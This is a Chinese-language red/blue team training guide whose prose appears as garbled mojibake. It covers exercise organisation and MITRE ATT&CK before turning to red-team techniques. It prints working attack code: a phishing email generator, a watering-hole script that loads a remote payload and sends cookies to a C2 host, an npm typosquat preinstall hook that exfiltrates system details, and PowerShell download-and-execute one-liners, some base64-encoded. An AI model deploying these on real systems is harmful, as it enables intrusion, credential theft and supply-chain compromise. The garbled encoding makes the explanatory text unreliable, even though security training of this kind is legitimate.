# çº¢è“å¯¹æŠ—å®Œæ•´å­¦ä¹ æŒ‡å—

## ğŸ“‹ å­¦ä¹ è·¯çº¿å›¾

```
åŸºç¡€ç†è®º(2å‘¨) â†’ çº¢é˜ŸæŠ€æœ¯(6å‘¨) â†’ è“é˜ŸæŠ€æœ¯(6å‘¨) â†’ ç´«é˜ŸååŒ(2å‘¨) â†’ æ¼”ç»ƒå®æˆ˜(4å‘¨) â†’ é«˜çº§å¯¹æŠ—(æŒç»­)
```

## âš–ï¸ æ³•å¾‹å£°æ˜ä¸èŒä¸šé“å¾·

> **ä¸¥æ­£å£°æ˜**: æ‰€æœ‰çº¢è“å¯¹æŠ—æ´»åŠ¨å¿…é¡»åœ¨åˆæ³•æˆæƒçš„æ¡†æ¶å†…è¿›è¡Œï¼

### åˆæ³•åœºæ™¯
- âœ… ä¼ä¸šæˆæƒçš„æ”»é˜²æ¼”ç»ƒ
- âœ… æ­£è§„çš„çº¢è“å¯¹æŠ—ç«èµ›
- âœ… å®‰å…¨æµ‹è¯•ä¸è¯„ä¼°é¡¹ç›®
- âœ… å†…éƒ¨å®‰å…¨åŸ¹è®­æ¼”ç»ƒ

### ä¸¥æ ¼ç¦æ­¢
- âŒ æœªæˆæƒçš„æ”»å‡»æµ‹è¯•
- âŒ ç ´åæ€§æ”»å‡»è¡Œä¸º
- âŒ æ•°æ®çªƒå–å’Œæ³„éœ²
- âŒ å‹’ç´¢å’Œæ•²è¯ˆè¡Œä¸º

---

## æ¨¡å—ä¸€ï¼šå¯¹æŠ—åŸºç¡€ä¸ç»„ç»‡å»ºè®¾

### æ¨¡å—æ€»è§ˆï¼ˆå®šä½ä¸è¾“å‡ºï¼‰
- **å­¦ä¹ ç›®æ ‡**ï¼šå»ºç«‹å¯¹çº¢è“å¯¹æŠ—çš„æ•´ä½“è®¤çŸ¥ï¼Œç†è§£ç»„ç»‡æ¶æ„ã€è§’è‰²åˆ†å·¥ã€æµç¨‹è§„èŒƒåŠåˆè§„è¦æ±‚ï¼Œä¸ºåç»­æ¨¡å—å¥ å®šç»Ÿä¸€æ ‡å‡†ã€‚
- **è¾¾æˆæŒ‡æ ‡**ï¼šèƒ½å¤Ÿè®¾è®¡ä¼ä¸šçº§çº¢è“å¯¹æŠ—è®¡åˆ’ï¼Œç»˜åˆ¶ç»„ç»‡åä½œå…³ç³»å›¾ï¼Œåˆ¶å®šæˆæƒåˆçº¦ä¸å®‰å…¨åŸºçº¿æ¸…å•ï¼Œå®Œæˆä¸€æ¬¡æ¼”ç»ƒå‰è¯„ä¼°ã€‚
- **å…³é”®äº§å‡º**ï¼š
  - å¯¹æŠ—ç»„ç»‡æ¶æ„å›¾ï¼ˆçº¢/è“/ç™½/ç´«é˜ŸèŒè´£çŸ©é˜µï¼‰
  - æˆæƒæ–‡æ¡£æ¨¡æ¿ã€é£é™©è¯„ä¼°è¡¨ã€é€šä¿¡æ‰‹å†Œ
  - å¯¹æŠ—æˆç†Ÿåº¦è‡ªæ£€è¡¨ä¸æ¨è¿›è·¯çº¿å›¾

> æ¨èèŠ‚å¥ï¼š
> - ç¬¬1å‘¨ï¼šæ³•å¾‹ä¼¦ç†ã€ç»„ç»‡æ¶æ„ã€è§’è‰²RACIæ¢³ç†ã€‚
> - ç¬¬2å‘¨ï¼šæ¼”ç»ƒæµç¨‹ã€é£é™©æ§åˆ¶ã€åº¦é‡æŒ‡æ ‡è®¾è®¡ã€‚
> - ç¬¬3å‘¨ï¼šå®Œæˆæˆæƒæµç¨‹æ¨¡æ‹Ÿã€æˆç†Ÿåº¦è¯„ä¼°ä¸æ”¹è¿›è®¡åˆ’ã€‚

#### èƒ½åŠ›æˆç†Ÿåº¦æ¨¡å‹ï¼ˆCapability Maturity Modelï¼‰
| ç­‰çº§ | æè¿° | å…³é”®ç‰¹å¾ | éœ€è§£å†³çš„é—®é¢˜ |
| --- | --- | --- | --- |
| Level 1 åº”æ€¥å‹ | æ— æ­£å¼æµç¨‹ï¼Œä¾é ä¸ªäººç»éªŒ | ä¸´æ—¶æ‹‰é€šæ²Ÿé€šã€ç¼ºä¹è§„èŒƒ | æˆæƒæµç¨‹ç¼ºå¤±ã€å½±å“ä¸å¯æ§ |
| Level 2 è®¡åˆ’å‹ | æœ‰åŸºç¡€è®¡åˆ’ä¸æ¸…å• | å½¢æˆæ¼”ç»ƒè®¡åˆ’ã€æŒ‡å®šè´Ÿè´£äºº | æµ‹è¯•èŒƒå›´æ¨¡ç³Šã€è¯æ®ç®¡ç†è–„å¼± |
| Level 3 ä½“ç³»å‹ | å»ºç«‹å…¨æµç¨‹SOPä¸å·¥å…·é“¾ | ç»Ÿä¸€æ¨¡æ¿ã€è‡ªåŠ¨åŒ–è®°å½•ã€å®šæœŸæ¼”ç»ƒ | æŒ‡æ ‡ä½“ç³»ä¸å®Œå–„ã€ååŒæ•ˆç‡æœ‰å¾…æå‡ |
| Level 4 ä¼˜åŒ–å‹ | æ•°æ®é©±åŠ¨æŒç»­æ”¹è¿› | å¨èƒæƒ…æŠ¥é©±åŠ¨ã€é˜²å¾¡åŠæ—¶è¿­ä»£ | ç¼ºä¹æ”»é˜²çŸ¥è¯†åº“ä¸ç»éªŒæ²‰æ·€ |
| Level 5 æ™ºèƒ½å‹ | æ”»é˜²ä¸€ä½“åŒ–ã€è‡ªåŠ¨åŒ–å¯¹æŠ— | AIOpsè¾…åŠ©æ£€æµ‹ã€ç´«é˜Ÿå¸¸æ€åŒ– | éœ€è¦è·¨éƒ¨é—¨å®‰å…¨æ²»ç†ä¸ç”Ÿæ€åˆä½œ |

#### å‰ç½®è‡ªæ£€ï¼ˆBefore-Action Checklistï¼‰
- [ ] æ˜¯å¦æ‹¥æœ‰ç»è¿‡æ³•åŠ¡å®¡æ ¸çš„æˆæƒä¹¦ã€è´£ä»»è±å…ä¹¦ï¼Ÿ
- [ ] æ˜¯å¦å»ºç«‹çº¢/è“/ç™½/ç´«é˜Ÿè”ç³»äººæ¸…å•åŠ24å°æ—¶é€šä¿¡æœºåˆ¶ï¼Ÿ
- [ ] æ˜¯å¦ç¡®è®¤æ¼”ç»ƒç¯å¢ƒéš”ç¦»ç­–ç•¥ã€å›æ»šæœºåˆ¶ã€èµ„æºä¿éšœè®¡åˆ’ï¼Ÿ
- [ ] æ˜¯å¦å®Œæˆå…³é”®èµ„äº§ã€ä¸šåŠ¡ã€ä¾›åº”é“¾çš„ä¼˜å…ˆçº§æ’åºï¼Ÿ
- [ ] æ˜¯å¦åˆ¶å®šæ¼”ç»ƒä¸­æ–­ä¸åº”æ€¥å‡çº§æµç¨‹ï¼Ÿ

### 1.1 æ ¸å¿ƒæ¦‚å¿µ

#### çº¢è“å¯¹æŠ—å®šä¹‰
**çº¢è“å¯¹æŠ—**æ˜¯ä¸€ç§æ¨¡æ‹ŸçœŸå®æ”»å‡»åœºæ™¯çš„ç½‘ç»œå®‰å…¨æ¼”ç»ƒæ–¹å¼ï¼Œé€šè¿‡çº¢é˜Ÿï¼ˆæ”»å‡»æ–¹ï¼‰ã€è“é˜Ÿï¼ˆé˜²å®ˆæ–¹ï¼‰ã€ç™½é˜Ÿï¼ˆè£åˆ¤æ–¹ï¼‰ä¸‰æ–¹å¯¹æŠ—ï¼Œå…¨é¢æ£€éªŒä¼ä¸šå®‰å…¨é˜²æŠ¤èƒ½åŠ›ã€‚

**æ ¸å¿ƒä»·å€¼**:
```
1. æ£€éªŒé˜²å¾¡ä½“ç³»æœ‰æ•ˆæ€§
2. å‘ç°å®‰å…¨ç›²ç‚¹å’Œå¼±ç‚¹
3. æå‡å®‰å…¨å›¢é˜Ÿå®æˆ˜èƒ½åŠ›
4. å®Œå–„åº”æ€¥å“åº”æµç¨‹
5. å»ºç«‹å®‰å…¨æ–‡åŒ–æ„è¯†
```

#### å›¢é˜Ÿè§’è‰²å®šä½

**çº¢é˜Ÿï¼ˆRed Teamï¼‰**:
```
èŒè´£:
- æ¨¡æ‹ŸçœŸå®æ”»å‡»è€…è¡Œä¸º
- çªç ´é˜²å¾¡ä½“ç³»
- çªƒå–æ•æ„Ÿæ•°æ®
- å»ºç«‹æŒä¹…åŒ–æ§åˆ¶

ç›®æ ‡:
- å‘ç°å®‰å…¨å¼±ç‚¹
- æµ‹è¯•æ£€æµ‹èƒ½åŠ›
- è¯„ä¼°å“åº”æ•ˆç‡
```

**è“é˜Ÿï¼ˆBlue Teamï¼‰**:
```
èŒè´£:
- ç›‘æ§ç½‘ç»œæµé‡
- æ£€æµ‹å¼‚å¸¸è¡Œä¸º
- å“åº”å®‰å…¨äº‹ä»¶
- åŠ å›ºé˜²å¾¡ä½“ç³»

ç›®æ ‡:
- åŠæ—¶å‘ç°æ”»å‡»
- å¿«é€Ÿå“åº”å¤„ç½®
- æœ€å°åŒ–å½±å“
- æŒç»­æ”¹è¿›é˜²å¾¡
```

**ç™½é˜Ÿï¼ˆWhite Teamï¼‰**:
```
èŒè´£:
- åˆ¶å®šæ¼”ç»ƒè§„åˆ™
- ç›‘ç£æ¼”ç»ƒè¿‡ç¨‹
- è¯„ä¼°æ”»é˜²æ•ˆæœ
- åè°ƒåŒæ–¹å†²çª

ç›®æ ‡:
- ç¡®ä¿æ¼”ç»ƒå®‰å…¨
- å…¬æ­£è¯„åˆ¤ç»“æœ
- æ€»ç»“ç»éªŒæ•™è®­
```

**ç´«é˜Ÿï¼ˆPurple Teamï¼‰**:
```
èŒè´£:
- åè°ƒçº¢è“åŒæ–¹
- å…±äº«æ”»å‡»æŠ€æœ¯
- ä¼˜åŒ–é˜²å¾¡ç­–ç•¥
- çŸ¥è¯†ä¼ é€’åŸ¹è®­

ç›®æ ‡:
- æå‡æ•´ä½“å®‰å…¨èƒ½åŠ›
- ä¿ƒè¿›åä½œæ²Ÿé€š
- æŒç»­å®‰å…¨æ”¹è¿›
```

#### è§’è‰²èŒè´£çŸ©é˜µï¼ˆRACIï¼‰
| å·¥ä½œåŒ… | çº¢é˜Ÿ | è“é˜Ÿ | ç™½é˜Ÿ | ç´«é˜Ÿ |
| --- | --- | --- | --- | --- |
| æ¼”ç»ƒèŒƒå›´åˆ¶å®š | A | C | R | I |
| æˆæƒä¸åˆè§„è¯„å®¡ | C | C | A/R | I |
| ä¾¦å¯Ÿä¸æ”»å‡»æ‰§è¡Œ | R | I | C | A |
| æ£€æµ‹ä¸å“åº” | I | A/R | C | C |
| å½“æ—¥å¤ç›˜ä¼šè®® | R | R | A | C |
| æ¼”ç»ƒæŠ¥å‘Šäº¤ä»˜ | C | C | A/R | R |
| çŸ¥è¯†åº“æ›´æ–° | C | C | I | A |

> **è¯´æ˜**ï¼šA=Accountableï¼ˆæœ€ç»ˆè´Ÿè´£ï¼‰ï¼ŒR=Responsibleï¼ˆæ‰§è¡Œï¼‰ï¼ŒC=Consultedï¼ˆå’¨è¯¢ï¼‰ï¼ŒI=Informedï¼ˆçŸ¥æƒ…ï¼‰ã€‚

#### å¯¹æŠ—æ²Ÿé€šæ‰‹å†Œï¼ˆCommunication Runbookï¼‰
- **æ—¥å¸¸åŒæ­¥**ï¼šæ¯æ—¥å›ºå®šæ—¶é—´å¬å¼€â€œæ”»é˜²ä¾‹ä¼šâ€ï¼Œçº¢é˜Ÿæ±‡æŠ¥æ”»å‡»è¿›å±•ï¼Œè“é˜Ÿåˆ†äº«æ£€æµ‹å“åº”ï¼Œç™½é˜Ÿè®°å½•è¡ŒåŠ¨é¡¹ã€‚
- **é‡å¤§å‘Šè­¦**ï¼šè‹¥å‡ºç°ä¸šåŠ¡å½±å“æˆ–æ•æ„Ÿèµ„äº§è®¿é—®ï¼Œéœ€åœ¨5åˆ†é’Ÿå†…é€šè¿‡åº”æ€¥ç¾¤ï¼ˆIM+ç”µè¯ï¼‰é€šçŸ¥æ‰€æœ‰è´£ä»»äººï¼Œå¹¶åŒæ­¥æ‰§è¡Œåœæ­¢æ¡ä»¶è¯„ä¼°ã€‚
- **è¯æ®æäº¤æµç¨‹**ï¼šçº¢é˜Ÿä¸Šä¼ æ”»å‡»è¯æ®è‡³åŠ å¯†å­˜å‚¨ï¼ˆåªè¯»æƒé™ï¼‰ï¼Œè“é˜ŸåŒæ­¥æ£€æµ‹æ—¥å¿—ï¼Œç™½é˜Ÿç‰µå¤´ç¼–å·ã€æ ‡è®°æ•æ„Ÿçº§åˆ«å¹¶å®šæœŸå¤‡ä»½ã€‚
- **å½±å“è¯„ä¼°æµç¨‹**ï¼šç™½é˜Ÿç‰µå¤´ç»„ç»‡ä¸šåŠ¡è´Ÿè´£äººã€ITã€çº¢è“ä»£è¡¨å¬å¼€å¿«é€Ÿè¯„ä¼°ä¼šï¼Œç¡®å®šæ˜¯å¦è¿›å…¥åº”æ€¥æ¨¡å¼æˆ–è°ƒæ•´èŒƒå›´ã€‚
- **ä¿å¯†çº¦å®š**ï¼šæ¼”ç»ƒç»†èŠ‚ä»…é™æˆæƒèŒƒå›´äººå‘˜çŸ¥æ™“ï¼Œå¿…è¦æ—¶ç­¾ç½²NDAï¼Œç™½é˜Ÿè´Ÿè´£å®¡è®¡è®¿é—®æ—¥å¿—å’Œèµ„æ–™é”€æ¯è®¡åˆ’ã€‚

### 1.2 æ”»é˜²æ¼”ç»ƒå‚è€ƒæ¡†æ¶

#### MITRE ATT&CKæ¡†æ¶

**æˆ˜æœ¯çŸ©é˜µï¼ˆ14ä¸ªæˆ˜æœ¯é˜¶æ®µï¼‰**:
```
åˆå§‹è®¿é—® (Initial Access)
â”œâ”€â”€ é’“é±¼æ”»å‡»
â”œâ”€â”€ ä¾›åº”é“¾æ”»å‡»
â”œâ”€â”€ å¤–éƒ¨æœåŠ¡åˆ©ç”¨
â””â”€â”€ æœ‰æ•ˆè´¦æˆ·

æ‰§è¡Œ (Execution)
â”œâ”€â”€ å‘½ä»¤å’Œè„šæœ¬è§£é‡Šå™¨
â”œâ”€â”€ ç”¨æˆ·æ‰§è¡Œ
â”œâ”€â”€ è®¡åˆ’ä»»åŠ¡
â””â”€â”€ ç³»ç»ŸæœåŠ¡

æŒä¹…åŒ– (Persistence)
â”œâ”€â”€ è´¦æˆ·æ“çºµ
â”œâ”€â”€ å¯åŠ¨æ–‡ä»¶å¤¹
â”œâ”€â”€ è®¡åˆ’ä»»åŠ¡
â””â”€â”€ æœåŠ¡åˆ›å»º

æƒé™æå‡ (Privilege Escalation)
â”œâ”€â”€ è¿›ç¨‹æ³¨å…¥
â”œâ”€â”€ è®¿é—®ä»¤ç‰Œæ“çºµ
â”œâ”€â”€ æå‡æƒé™
â””â”€â”€ æ»¥ç”¨ç‰¹æƒ

é˜²å¾¡è§„é¿ (Defense Evasion)
â”œâ”€â”€ æ··æ·†æ–‡ä»¶/ä¿¡æ¯
â”œâ”€â”€ å¸è½½å®‰å…¨è½¯ä»¶
â”œâ”€â”€ è¿›ç¨‹éšè—
â””â”€â”€ è™šæ‹ŸåŒ–æ£€æµ‹è§„é¿

å‡­è¯è®¿é—® (Credential Access)
â”œâ”€â”€ å‡­è¯è½¬å‚¨
â”œâ”€â”€ æš´åŠ›ç ´è§£
â”œâ”€â”€ é”®ç›˜è®°å½•
â””â”€â”€ ç½‘ç»œå—…æ¢

å‘ç° (Discovery)
â”œâ”€â”€ ç³»ç»Ÿä¿¡æ¯å‘ç°
â”œâ”€â”€ ç½‘ç»œé…ç½®å‘ç°
â”œâ”€â”€ è´¦æˆ·å‘ç°
â””â”€â”€ è¿œç¨‹ç³»ç»Ÿå‘ç°

æ¨ªå‘ç§»åŠ¨ (Lateral Movement)
â”œâ”€â”€ è¿œç¨‹æœåŠ¡
â”œâ”€â”€ å†…éƒ¨é’“é±¼
â”œâ”€â”€ å…±äº«èµ„æºåˆ©ç”¨
â””â”€â”€ Windowsè¿œç¨‹ç®¡ç†

æ”¶é›† (Collection)
â”œâ”€â”€ æ•°æ®æ”¶é›†
â”œâ”€â”€ å±å¹•æˆªå›¾
â”œâ”€â”€ éŸ³é¢‘æ•è·
â””â”€â”€ å‰ªè´´æ¿æ•°æ®

å‘½ä»¤ä¸æ§åˆ¶ (Command and Control)
â”œâ”€â”€ åº”ç”¨å±‚åè®®
â”œâ”€â”€ åŠ å¯†é€šé“
â”œâ”€â”€ éæ ‡å‡†ç«¯å£
â””â”€â”€ åŸŸåç”Ÿæˆç®—æ³•

æ¸—å‡º (Exfiltration)
â”œâ”€â”€ é€šè¿‡C2é€šé“
â”œâ”€â”€ é€šè¿‡æ›¿ä»£åè®®
â”œâ”€â”€ æ•°æ®å‹ç¼©
â””â”€â”€ è‡ªåŠ¨åŒ–æ¸—å‡º

å½±å“ (Impact)
â”œâ”€â”€ æ•°æ®åŠ å¯†
â”œâ”€â”€ æ•°æ®ç ´å
â”œâ”€â”€ æœåŠ¡åœæ­¢
â””â”€â”€ èµ„æºåŠ«æŒ
```

**å®æˆ˜åº”ç”¨**:
```python
# ATT&CKæŠ€æœ¯æ˜ å°„è„šæœ¬
class ATTACKMapping:
    def __init__(self):
        self.techniques = {
            'T1566': {  # Phishing
                'tactic': 'Initial Access',
                'name': 'é’“é±¼æ”»å‡»',
                'detection': [
                    'é‚®ä»¶ç½‘å…³ç›‘æ§',
                    'ç”¨æˆ·è¡Œä¸ºåˆ†æ',
                    'é™„ä»¶æ²™ç®±æ£€æµ‹'
                ],
                'mitigation': [
                    'å®‰å…¨æ„è¯†åŸ¹è®­',
                    'DMARCé…ç½®',
                    'é‚®ä»¶è¿‡æ»¤è§„åˆ™'
                ]
            },
            'T1003': {  # OS Credential Dumping
                'tactic': 'Credential Access',
                'name': 'å‡­è¯è½¬å‚¨',
                'detection': [
                    'LSASSè¿›ç¨‹ç›‘æ§',
                    'æ³¨å†Œè¡¨ç›‘æ§',
                    'å¼‚å¸¸å·¥å…·æ£€æµ‹'
                ],
                'mitigation': [
                    'LSAä¿æŠ¤',
                    'Credential Guard',
                    'æœ€å°æƒé™åŸåˆ™'
                ]
            }
        }

    def map_red_team_action(self, action_log):
        """
        å°†çº¢é˜Ÿè¡ŒåŠ¨æ˜ å°„åˆ°ATT&CKæŠ€æœ¯
        """
        mapped_techniques = []
        for action in action_log:
            if 'mimikatz' in action.lower():
                mapped_techniques.append('T1003')
            elif 'phish' in action.lower():
                mapped_techniques.append('T1566')
        return mapped_techniques

    def generate_blue_team_playbook(self, techniques):
        """
        ç”Ÿæˆè“é˜Ÿåº”å¯¹æ‰‹å†Œ
        """
        playbook = []
        for tech_id in techniques:
            if tech_id in self.techniques:
                tech = self.techniques[tech_id]
                playbook.append({
                    'technique': tech['name'],
                    'detection_methods': tech['detection'],
                    'mitigation_steps': tech['mitigation']
                })
        return playbook
```

---

## æ¨¡å—äºŒï¼šçº¢é˜Ÿä½œæˆ˜ä½“ç³»

### æ¨¡å—æ€»è§ˆï¼ˆçº¢é˜Ÿè§†è§’ï¼‰
- **æ ¸å¿ƒç›®æ ‡**ï¼šæŒæ¡ç°ä»£çº¢é˜Ÿä»ä¾¦å¯Ÿã€æ­¦å™¨åŒ–ã€æŠ•é€’ã€æ‰§è¡Œåˆ°è¡ŒåŠ¨ç»´æŒçš„å®Œæ•´é“¾è·¯ï¼Œèƒ½å¤Ÿæ ¹æ®ä¸åŒä¼ä¸šåœºæ™¯åˆ¶å®šå¯æ§ã€å¯å¤ç°çš„æ”»å‡»å‰§æœ¬ã€‚
- **å…³é”®èƒ½åŠ›ç‚¹**ï¼š
  - Kill Chain å¯¹é½ï¼šRecon â†’ Initial Access â†’ Privilege Escalation â†’ Lateral Movement â†’ Action on Objectiveã€‚
  - å·¥å…·ä¸è‡ªç ”ç»“åˆï¼šç†Ÿæ‚‰ä¸»æµC2å¹³å°ã€è„šæœ¬æ¡†æ¶ä¸è‡ªç ”æ¨¡å—ï¼Œå…·å¤‡å¿«é€Ÿå®šåˆ¶èƒ½åŠ›ã€‚
  - éšè”½ä¸å¯¹æŠ—ï¼šæŒæ¡æµé‡æ··æ·†ã€ç‰¹å¾è§„é¿ã€æ—¥å¿—æ¸…æ´—ç­‰éšè”½æŠ€å·§ã€‚
- **äº¤ä»˜æ¸…å•**ï¼šçº¢é˜Ÿä½œæˆ˜æ‰‹å†Œã€æ”»å‡»è·¯å¾„å›¾ã€POC/EXPä»£ç åº“ã€é£é™©è¯„ä¼°ä¸ç¼“è§£å»ºè®®ã€è¯æ®å½’é›†è¡¨ã€‚

#### çº¢é˜Ÿä½œæˆ˜åŸºçº¿ï¼ˆRed Team Baselineï¼‰
| ç»´åº¦ | åŸºç¡€è¦æ±‚ | è¿›é˜¶è¦æ±‚ | ä¸“å®¶è¦æ±‚ |
| --- | --- | --- | --- |
| æƒ…æŠ¥å‡†å¤‡ | èµ„äº§æŒ‡çº¹ã€æ¼æ´æƒ…æŠ¥åˆ—è¡¨ | èåˆå¨èƒæƒ…æŠ¥ã€è¡Œä¸šæ¡ˆä¾‹ | æ„å»ºæƒ…æŠ¥ç®¡é“ã€åˆ†æå¯¹æ‰‹TTP | 
| C2åŸºç¡€è®¾æ–½ | å•èŠ‚ç‚¹C2ã€HTTPé€šé“ | å¤šèŠ‚ç‚¹C2ã€æ··åˆåè®®ã€åŸŸå‰ç½® | åŠ¨æ€åŸŸå‰ç½®ã€CDNæ··æ·†ã€Cloud C2 |
| å·¥å…·é“¾ | ç†Ÿæ‚‰å…¬å¼€å·¥å…·ã€æŒæ¡é…ç½® | å®šåˆ¶Payloadã€è„šæœ¬åŒ–æµç¨‹ | è‡ªç ”æ¡†æ¶ã€åæº¯æºæœºåˆ¶ |
| éšè”½æ€§ | åŸºç¡€æ··æ·†ã€æ—¥å¿—æ¸…ç† | æµé‡ä¼ªè£…ã€è¯æ®æœ€å°åŒ– | å¯¹æŠ—EDR/IPSã€åæŒ‡çº¹è¿½è¸ª |
| å¤ç›˜èƒ½åŠ› | ç®€å•æŠ¥å‘Š | é“¾è·¯å¤ç›˜+å½±å“è¯„ä¼° | æ•°æ®é©±åŠ¨æ”»é˜²æŒ‡æ ‡ã€ç°ç›’éªŒè¯ |

> **æç¤º**ï¼šçº¢é˜Ÿå¿…é¡»éµå®ˆâ€œå¯æ§æ€§â€â€œå¯å›æ»šâ€â€œå¯å®¡è®¡â€ä¸‰å¤§åŸåˆ™ï¼Œæ¼”ç»ƒä¸­å¯¹æ¯ä¸ªé«˜å±æ­¥éª¤è®¾ç½®â€œå®‰å…¨é˜ˆå€¼â€ä¸â€œç´§æ€¥æŒ‰é’®â€ã€‚

### 2.1 åˆå§‹è®¿é—®æŠ€æœ¯

#### é’“é±¼æ”»å‡»ï¼ˆPhishingï¼‰

**é‚®ä»¶é’“é±¼**:
```python
# é’“é±¼é‚®ä»¶ç”Ÿæˆè„šæœ¬ï¼ˆä»…ç”¨äºæˆæƒæ¼”ç»ƒï¼‰
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

class PhishingCampaign:
    def __init__(self, smtp_server, smtp_port):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port

    def create_template(self, target_name, company):
        """
        åˆ›å»ºä¸ªæ€§åŒ–é’“é±¼é‚®ä»¶æ¨¡æ¿
        """
        template = f"""
        å°Šæ•¬çš„{target_name}ï¼Œ

        æ‚¨çš„{company}è´¦æˆ·éœ€è¦éªŒè¯ã€‚è¯·ç‚¹å‡»ä»¥ä¸‹é“¾æ¥å®ŒæˆéªŒè¯ï¼š

        https://phishing-domain.com/verify?user={target_name}

        æ­¤é“¾æ¥å°†åœ¨24å°æ—¶åå¤±æ•ˆã€‚

        {company}å®‰å…¨å›¢é˜Ÿ
        """
        return template

    def attach_malicious_macro(self, filename):
        """
        é™„åŠ æ¶æ„å®æ–‡æ¡£ï¼ˆæ¼”ç»ƒç”¨ï¼‰
        """
        # ç”ŸæˆåŒ…å«å®çš„Officeæ–‡æ¡£
        # å®é™…ä»£ç ç•¥ï¼Œéœ€è¦ä½¿ç”¨python-docxç­‰åº“
        pass

    def track_email_open(self, email_id):
        """
        è·Ÿè¸ªé‚®ä»¶æ‰“å¼€æƒ…å†µ
        """
        tracking_pixel = f'<img src="https://tracker.com/pixel.gif?id={email_id}" width="1" height="1" />'
        return tracking_pixel

# Gophishé’“é±¼å¹³å°ä½¿ç”¨
"""
1. å®‰è£…Gophish
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
./gophish

2. è®¿é—®ç®¡ç†ç•Œé¢
https://localhost:3333

3. åˆ›å»ºé’“é±¼æ´»åŠ¨
- ç”¨æˆ·ç»„ï¼šå¯¼å…¥ç›®æ ‡é‚®ç®±åˆ—è¡¨
- é‚®ä»¶æ¨¡æ¿ï¼šè®¾è®¡é’“é±¼é‚®ä»¶
- ç€é™†é¡µï¼šå…‹éš†çœŸå®ç™»å½•é¡µé¢
- å‘é€é…ç½®ï¼šSMTPæœåŠ¡å™¨è®¾ç½®

4. ç›‘æ§ç»“æœ
- é‚®ä»¶å‘é€çŠ¶æ€
- æ‰“å¼€ç‡
- ç‚¹å‡»ç‡
- å‡­è¯æäº¤ç‡
"""
```

**æ°´å‘æ”»å‡»ï¼ˆWatering Holeï¼‰**:
```javascript
// æ°´å‘æ”»å‡»æ¤å…¥è„šæœ¬
(function() {
    // æ£€æµ‹ç›®æ ‡ç”¨æˆ·
    var targetCompany = 'target-company.com';
    var userDomain = document.referrer;

    if (userDomain.includes(targetCompany)) {
        // åŠ è½½æ¶æ„è½½è·
        var script = document.createElement('script');
        script.src = 'https://malicious-cdn.com/payload.js';
        document.head.appendChild(script);

        // ä¿¡æ¯æ”¶é›†
        var info = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookies: document.cookie,
            referrer: document.referrer
        };

        // å›ä¼ ä¿¡æ¯
        fetch('https://c2-server.com/collect', {
            method: 'POST',
            body: JSON.stringify(info)
        });
    }
})();
```

#### ä¾›åº”é“¾æ”»å‡»

**è½¯ä»¶ä¾›åº”é“¾å…¥ä¾µ**:
```bash
# npmåŒ…æŠ•æ¯’ç¤ºä¾‹ï¼ˆä»…ç”¨äºç†è§£åŸç†ï¼‰
# package.json
{
  "name": "popular-package-typo",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "node malicious-script.js"
  }
}

# malicious-script.js
const https = require('https');
const os = require('os');

// æ”¶é›†ç³»ç»Ÿä¿¡æ¯
const systemInfo = {
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    user: process.env.USER || process.env.USERNAME,
    cwd: process.cwd()
};

// å›ä¼ åˆ°C2æœåŠ¡å™¨
const data = JSON.stringify(systemInfo);
const options = {
    hostname: 'c2-server.com',
    port: 443,
    path: '/collect',
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Content-Length': data.length
    }
};

const req = https.request(options);
req.write(data);
req.end();
```

### æ”»å‡»é“¾ç­–åˆ’å·¥ä½œåŠï¼ˆKill Chain Workshopï¼‰
1. **æƒ…æŠ¥æ”¶æ•›**ï¼šç»“åˆShodanã€Fofaã€Gitæ³„éœ²ã€äººå‘˜ç¤¾äº¤åª’ä½“ã€æ‹›è˜ä¿¡æ¯ç¡®å®šæŠ€æœ¯æ ˆä¸æ½œåœ¨å…¥å£ã€‚
2. **å…¥å£æ’åˆ—**ï¼šä¾æ®æ”»å‡»æ”¶ç›Šã€æŠ•å…¥æˆæœ¬ã€è¢«å‘ç°æ¦‚ç‡æ‰“åˆ†ï¼Œå½¢æˆâ€œå…¥å£ä¼˜å…ˆçº§çŸ©é˜µï¼ˆä»·å€¼ Ã— éšè”½ Ã— æˆæœ¬ï¼‰â€ã€‚
3. **è¡ŒåŠ¨è„šæœ¬**ï¼šä¸ºæ¯ä¸ªå…¥å£ç¼–å†™è¡ŒåŠ¨è„šæœ¬ï¼ŒåŒ…å«å‰ææ¡ä»¶ã€å·¥å…·ã€å‘½ä»¤ã€å›æ»šæ­¥éª¤ã€å¯èƒ½è§¦å‘çš„å‘Šè­¦ç‚¹ã€‚
4. **å®‰å…¨é˜€è®¾ç½®**ï¼šå®šä¹‰æ¯ä¸ªé˜¶æ®µçš„æ½œåœ¨å½±å“ï¼ˆä¸šåŠ¡ã€æ•°æ®ã€èˆ†æƒ…ï¼‰ï¼Œä¸€æ—¦è§¦å‘é˜ˆå€¼ç«‹å³é€šçŸ¥ç™½é˜Ÿè¯„ä¼°æ˜¯å¦ä¸­æ­¢ã€‚
5. **è¯æ®ç­–ç•¥**ï¼šå…¨ç¨‹ä½¿ç”¨åŠ å¯†æ—¥å¿—ã€è‡ªå®šä¹‰è„šæœ¬è‡ªåŠ¨è®°å½•å‘½ä»¤ã€æ—¶é—´æˆ³ã€ç›®æ ‡ï¼Œç¡®ä¿å›æº¯æ€§ã€‚

> å»ºè®®åˆ©ç”¨ç™½æ¿æˆ–Miroç»˜åˆ¶æ”»å‡»é“¾å›¾ï¼ˆChain of Attackï¼‰ï¼Œæ ‡æ³¨å¯¹åº”çš„MITREæŠ€æœ¯ç¼–å·ä¸è“é˜Ÿé¢„æœŸå‘Šè­¦ç‚¹ã€‚

### 2.2 æ‰§è¡ŒæŠ€æœ¯

#### PowerShellæ”»å‡»

**æ— æ–‡ä»¶æ”»å‡»ï¼ˆFileless Attackï¼‰**:
```powershell
# å†…å­˜æ‰§è¡ŒPowerShellè„šæœ¬
IEX (New-Object Net.WebClient).DownloadString('http://c2-server.com/payload.ps1')

# Base64ç¼–ç æ‰§è¡Œ
$command = 'IEX (New-Object Net.WebClient).DownloadString("http://c2-server.com/payload.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encodedCommand

